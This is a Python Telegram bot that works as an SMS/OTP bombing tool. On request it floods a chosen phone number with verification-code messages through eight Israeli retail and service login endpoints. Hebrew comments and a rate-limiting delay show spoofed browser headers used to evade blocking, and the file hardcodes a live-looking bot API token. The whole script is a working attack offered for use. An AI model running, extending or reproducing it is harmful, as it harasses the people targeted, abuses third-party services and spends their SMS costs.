import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os
import uuid

app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

API_TOKEN = '8788411826:AAG5BMCIL_iNCfgX8kM2f5BIzN6RZtd_C30' 
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    apis = [
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/login"},
        {"n": "Dominos", "u": "https://www.dominos.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.dominos.co.il/"},
        {"n": "Yellow (Paz)", "u": "https://yellow.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://yellow.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Be Pharm", "u": "https://www.be-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.be-pharm.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"}
    ]
    
    for r in range(int(rounds)):
        success_count = 0
        for site in apis:
            try:
                # Headers משופרים מאוד לעקיפת חסימות
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "he-IL,he;q=0.9",
                    "Referer": site["ref"],
                    "Origin": site["ref"].rstrip('/'),
                    "X-Requested-With": "XMLHttpRequest",
                    "Sec-Ch-Ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"'
                }
                
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=8)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=8)
                
                if res.status_code in [200, 201, 204]:
                    success_count += 1
            except: pass
            time.sleep(0.3) # דיליי קטן כדי לא להיראות כמו בוט מהיר מדי
        
        bot.send_message(m.chat.id, f"⚡️ **סבב {r+1} הושלם!**\n✅ הצלחות: `{success_count}/{len(apis)}`", parse_mode="Markdown")
        if r < int(rounds) - 1: time.sleep(3)

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
            bot.reply_to(m, f"🚀 **מפעיל ספאם משולב על {parts[1]}...**", parse_mode="Markdown")
            attack(m, parts[1], parts[0])
    except: pass

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    bot.polling(none_stop=True)
